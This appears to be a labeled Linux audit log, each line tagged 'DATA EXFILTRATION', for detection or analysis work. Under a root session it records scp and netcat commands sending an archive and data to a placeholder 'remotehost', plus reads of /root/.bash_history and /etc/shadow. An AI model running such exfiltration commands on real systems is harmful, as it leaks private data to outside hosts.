DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:25:27.530:14563),proctitle=nc -w 3 remotehost 1234
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:25:37.512:14566),arch=x86_64,syscall=openat,success=yes,exit=3,a0=AT_FDCWD,a1=0x57eb8f319690,a2=O_WRONLY|O_APPEND,a3=0x0,items=1,ppid=3762,pid=3763,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=(none),ses=4,comm=bash,exe=/usr/bin/bash,subj=unconfined,key=PRIVILEGE_ESCALATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:25:37.517:14567),proctitle=bash
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:25:37.517:14567),item=0,name=/root/.bash_history,inode=917534,dev=08:02,mode=file,600,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:25:37.517:14567),cwd=/home/ubuntu
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:25:37.517:14567),arch=x86_64,syscall=openat,success=yes,exit=3,a0=AT_FDCWD,a1=0x57eb8f319690,a2=O_RDONLY,a3=0x0,items=1,ppid=3762,pid=3763,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=(none),ses=4,comm=bash,exe=/usr/bin/bash,subj=unconfined,key=PRIVILEGE_ESCALATION
DATA EXFILTRATION,type=USER_END,msg=audit(12/03/2025 03:25:37.607:14568),pid=3762,uid=root,auid=ubuntu,ses=4,subj=unconfined,op=PAM:session_close,"grantors=pam_env,pam_env,pam_mail,pam_limits,pam_permit,pam_umask,pam_unix,pam_systemd",acct=root,exe=/usr/bin/su,hostname=?,addr=?,terminal=/dev/pts/2,res=success
DATA EXFILTRATION,type=CRED_DISP,msg=audit(12/03/2025 03:25:37.614:14569),pid=3762,uid=root,auid=ubuntu,ses=4,subj=unconfined,op=PAM:setcred,grantors=pam_rootok,acct=root,exe=/usr/bin/su,hostname=?,addr=?,terminal=/dev/pts/2,res=success
DATA EXFILTRATION,type=USER_END,msg=audit(12/03/2025 03:25:37.733:14570),pid=3759,uid=ubuntu,auid=ubuntu,ses=4,subj=unconfined,op=PAM:session_close,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/1,res=success
DATA EXFILTRATION,type=CRED_DISP,msg=audit(12/03/2025 03:25:37.735:14571),pid=3759,uid=ubuntu,auid=ubuntu,ses=4,subj=unconfined,op=PAM:setcred,grantors=pam_permit,acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/1,res=success
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:25:47.764:14572),proctitle=/usr/libexec/accounts-daemon
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:25:47.764:14572),item=0,name=/etc/shadow,inode=2132944,dev=08:02,mode=file,640,ouid=root,ogid=shadow,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:25:47.764:14572),cwd=/
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:25:47.764:14572),arch=x86_64,syscall=openat,success=yes,exit=8,a0=AT_FDCWD,a1=0x7f2f5c001110,a2=O_RDONLY,a3=0x0,items=1,ppid=1,pid=1251,auid=unset,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=(none),ses=unset,comm=accounts-daemon,exe=/usr/libexec/accounts-daemon,subj=unconfined,key=PRIVILEGE_ESCALATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:25:47.798:14573),proctitle=/usr/libexec/accounts-daemon
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:25:47.798:14573),item=0,name=/etc/shadow,inode=2132944,dev=08:02,mode=file,640,ouid=root,ogid=shadow,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:25:47.798:14573),cwd=/
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:25:47.798:14573),arch=x86_64,syscall=openat,success=yes,exit=9,a0=AT_FDCWD,a1=0x7f2f6bdcf347,a2=O_RDONLY|O_CLOEXEC,a3=0x0,items=1,ppid=1,pid=1251,auid=unset,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=(none),ses=unset,comm=accounts-daemon,exe=/usr/libexec/accounts-daemon,subj=unconfined,key=PRIVILEGE_ESCALATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:25:47.801:14574),proctitle=/usr/libexec/accounts-daemon
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:25:47.801:14574),item=0,name=/etc/shadow,inode=2132944,dev=08:02,mode=file,640,ouid=root,ogid=shadow,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:25:47.801:14574),cwd=/
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:25:47.801:14574),arch=x86_64,syscall=openat,success=yes,exit=8,a0=AT_FDCWD,a1=0x7f2f6bdcf347,a2=O_RDONLY|O_CLOEXEC,a3=0x0,items=1,ppid=1,pid=1251,auid=unset,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=(none),ses=unset,comm=accounts-daemon,exe=/usr/libexec/accounts-daemon,subj=unconfined,key=PRIVILEGE_ESCALATION
DATA EXFILTRATION,type=USER_ACCT,msg=audit(12/03/2025 03:25:58.692:14577),pid=28157,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:accounting,"grantors=pam_permit,pam_localuser",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_REFR,msg=audit(12/03/2025 03:25:58.701:14579),pid=28157,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,"grantors=pam_permit,pam_cap",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_START,msg=audit(12/03/2025 03:25:58.704:14580),pid=28157,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_open,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:25:59.048:14583),proctitle=scp /tmp/data.tar.gz user@remotehost:/path
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:25:59.048:14583),item=1,name=/lib64/ld-linux-x86-64.so.2,inode=1853150,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:25:59.048:14583),item=0,name=/usr/bin/scp,inode=1837167,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:25:59.048:14583),cwd=/home/ubuntu
DATA EXFILTRATION,type=EXECVE,msg=audit(12/03/2025 03:25:59.048:14583),argc=3,a0=scp,a1=/tmp/data.tar.gz,a2=user@remotehost:/path
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:25:59.048:14583),arch=x86_64,syscall=execve,success=yes,exit=0,a0=0x5eaec8812b30,a1=0x5eaec8818df0,a2=0x5eaec8809400,a3=0x5eaec8812150,items=2,ppid=28139,pid=28167,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=scp,exe=/usr/bin/scp,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:25:59.053:14584),proctitle=scp /tmp/data.tar.gz user@remotehost:/path
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:25:59.053:14584),item=0,name=/var/run/nscd/socket,nametype=UNKNOWN,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:25:59.053:14584),cwd=/home/ubuntu
DATA EXFILTRATION,type=SOCKADDR,msg=audit(12/03/2025 03:25:59.053:14584),saddr={,saddr_fam=local,path=/var/run/nscd/socket,}
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:25:59.053:14584),arch=x86_64,syscall=connect,success=no,exit=ENOENT(No,such,file,or,directory),a0=0x3,a1=0x7ffde509f7e0,a2=0x6e,a3=0x1,items=1,ppid=28139,pid=28167,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=scp,exe=/usr/bin/scp,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:25:59.053:14585),proctitle=scp /tmp/data.tar.gz user@remotehost:/path
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:25:59.053:14585),item=0,name=/var/run/nscd/socket,nametype=UNKNOWN,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:25:59.053:14585),cwd=/home/ubuntu
DATA EXFILTRATION,type=SOCKADDR,msg=audit(12/03/2025 03:25:59.053:14585),saddr={,saddr_fam=local,path=/var/run/nscd/socket,}
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:25:59.053:14585),arch=x86_64,syscall=connect,success=no,exit=ENOENT(No,such,file,or,directory),a0=0x3,a1=0x7ffde509f9d0,a2=0x6e,a3=0x1,items=1,ppid=28139,pid=28167,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=scp,exe=/usr/bin/scp,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=USER_ACCT,msg=audit(12/03/2025 03:26:32.177:14588),pid=28175,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:accounting,"grantors=pam_permit,pam_localuser",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_REFR,msg=audit(12/03/2025 03:26:32.189:14590),pid=28175,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,"grantors=pam_permit,pam_cap",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_START,msg=audit(12/03/2025 03:26:32.191:14591),pid=28175,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_open,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_ACCT,msg=audit(12/03/2025 03:26:32.177:14588),pid=28175,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:accounting,"grantors=pam_permit,pam_localuser",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_REFR,msg=audit(12/03/2025 03:26:32.189:14590),pid=28175,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,"grantors=pam_permit,pam_cap",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_START,msg=audit(12/03/2025 03:26:32.191:14591),pid=28175,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_open,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_END,msg=audit(12/03/2025 03:26:32.230:14592),pid=28175,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_close,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_DISP,msg=audit(12/03/2025 03:26:32.230:14593),pid=28175,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,grantors=pam_permit,acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:26:32.495:14594),proctitle=scp /tmp/data.tar.gz user@remotehost:/path
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:26:32.495:14594),item=1,name=/lib64/ld-linux-x86-64.so.2,inode=1853150,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:26:32.495:14594),item=0,name=/usr/bin/scp,inode=1837167,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:26:32.495:14594),cwd=/home/ubuntu
DATA EXFILTRATION,type=EXECVE,msg=audit(12/03/2025 03:26:32.495:14594),argc=3,a0=scp,a1=/tmp/data.tar.gz,a2=user@remotehost:/path
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:26:32.495:14594),arch=x86_64,syscall=execve,success=yes,exit=0,a0=0x5eaec88090f0,a1=0x5eaec880c780,a2=0x5eaec8809400,a3=0x5eaec8808fa0,items=2,ppid=28139,pid=28185,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=scp,exe=/usr/bin/scp,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:26:32.503:14595),proctitle=scp /tmp/data.tar.gz user@remotehost:/path
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:26:32.503:14595),item=0,name=/var/run/nscd/socket,nametype=UNKNOWN,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:26:32.503:14595),cwd=/home/ubuntu
DATA EXFILTRATION,type=SOCKADDR,msg=audit(12/03/2025 03:26:32.503:14595),saddr={,saddr_fam=local,path=/var/run/nscd/socket,}
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:26:32.503:14595),arch=x86_64,syscall=connect,success=no,exit=ENOENT(No,such,file,or,directory),a0=0x3,a1=0x7fff828a9d90,a2=0x6e,a3=0x1,items=1,ppid=28139,pid=28185,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=scp,exe=/usr/bin/scp,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:26:32.506:14596),proctitle=scp /tmp/data.tar.gz user@remotehost:/path
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:26:32.506:14596),item=0,name=/var/run/nscd/socket,nametype=UNKNOWN,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:26:32.506:14596),cwd=/home/ubuntu
DATA EXFILTRATION,type=SOCKADDR,msg=audit(12/03/2025 03:26:32.506:14596),saddr={,saddr_fam=local,path=/var/run/nscd/socket,}
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:26:32.506:14596),arch=x86_64,syscall=connect,success=no,exit=ENOENT(No,such,file,or,directory),a0=0x3,a1=0x7fff828a9f80,a2=0x6e,a3=0x1,items=1,ppid=28139,pid=28185,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=scp,exe=/usr/bin/scp,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=USER_ACCT,msg=audit(12/03/2025 03:27:04.665:14599),pid=28195,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:accounting,"grantors=pam_permit,pam_localuser",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_REFR,msg=audit(12/03/2025 03:27:04.687:14601),pid=28195,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,"grantors=pam_permit,pam_cap",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_START,msg=audit(12/03/2025 03:27:04.691:14602),pid=28195,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_open,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:27:05.069:14605),proctitle=nc -w 3 remotehost 1234
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:27:05.069:14605),item=1,name=/lib64/ld-linux-x86-64.so.2,inode=1853150,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:27:05.069:14605),item=0,name=/usr/bin/nc,inode=1836100,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:27:05.069:14605),cwd=/home/ubuntu
DATA EXFILTRATION,type=EXECVE,msg=audit(12/03/2025 03:27:05.069:14605),argc=5,a0=nc,a1=-w,a2=3,a3=remotehost,a4=1234
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:27:05.069:14605),arch=x86_64,syscall=execve,success=yes,exit=0,a0=0x5eaec88125d0,a1=0x5eaec8815fb0,a2=0x5eaec8809400,a3=0x5eaec87f0d40,items=2,ppid=28139,pid=28202,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=nc,exe=/usr/bin/nc.openbsd,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=USER_ACCT,msg=audit(12/03/2025 03:27:36.200:14608),pid=28214,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:accounting,"grantors=pam_permit,pam_localuser",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_REFR,msg=audit(12/03/2025 03:27:36.214:14610),pid=28214,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,"grantors=pam_permit,pam_cap",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_START,msg=audit(12/03/2025 03:27:36.216:14611),pid=28214,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_open,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_ACCT,msg=audit(12/03/2025 03:27:36.200:14608),pid=28214,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:accounting,"grantors=pam_permit,pam_localuser",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_REFR,msg=audit(12/03/2025 03:27:36.214:14610),pid=28214,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,"grantors=pam_permit,pam_cap",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_START,msg=audit(12/03/2025 03:27:36.216:14611),pid=28214,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_open,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_END,msg=audit(12/03/2025 03:27:36.254:14612),pid=28214,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_close,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_DISP,msg=audit(12/03/2025 03:27:36.255:14613),pid=28214,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,grantors=pam_permit,acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=PROCTITLE,msg=audit(12/03/2025 03:27:36.396:14614),proctitle=nc -w 3 remotehost 1234
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:27:36.396:14614),item=1,name=/lib64/ld-linux-x86-64.so.2,inode=1853150,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=PATH,msg=audit(12/03/2025 03:27:36.396:14614),item=0,name=/usr/bin/nc,inode=1836100,dev=08:02,mode=file,755,ouid=root,ogid=root,rdev=00:00,nametype=NORMAL,cap_fp=none,cap_fi=none,cap_fe=0,cap_fver=0,cap_frootid=0
DATA EXFILTRATION,type=CWD,msg=audit(12/03/2025 03:27:36.396:14614),cwd=/home/ubuntu
DATA EXFILTRATION,type=EXECVE,msg=audit(12/03/2025 03:27:36.396:14614),argc=5,a0=nc,a1=-w,a2=3,a3=remotehost,a4=1234
DATA EXFILTRATION,type=SYSCALL,msg=audit(12/03/2025 03:27:36.396:14614),arch=x86_64,syscall=execve,success=yes,exit=0,a0=0x5eaec880de90,a1=0x5eaec88149e0,a2=0x5eaec8809400,a3=0x5eaec881ea60,items=2,ppid=28139,pid=28219,auid=ubuntu,uid=root,gid=root,euid=root,suid=root,fsuid=root,egid=root,sgid=root,fsgid=root,tty=pts5,ses=3,comm=nc,exe=/usr/bin/nc.openbsd,subj=unconfined,key=DATA_EXFILTRATION
DATA EXFILTRATION,type=USER_ACCT,msg=audit(12/03/2025 03:28:09.538:14617),pid=28235,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:accounting,"grantors=pam_permit,pam_localuser",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=CRED_REFR,msg=audit(12/03/2025 03:28:09.565:14619),pid=28235,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:setcred,"grantors=pam_permit,pam_cap",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_START,msg=audit(12/03/2025 03:28:09.572:14620),pid=28235,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:session_open,"grantors=pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
DATA EXFILTRATION,type=USER_ACCT,msg=audit(12/03/2025 03:28:09.538:14617),pid=28235,uid=root,auid=ubuntu,ses=3,subj=unconfined,op=PAM:accounting,"grantors=pam_permit,pam_localuser",acct=root,exe=/usr/bin/sudo,hostname=?,addr=?,terminal=/dev/pts/5,res=success
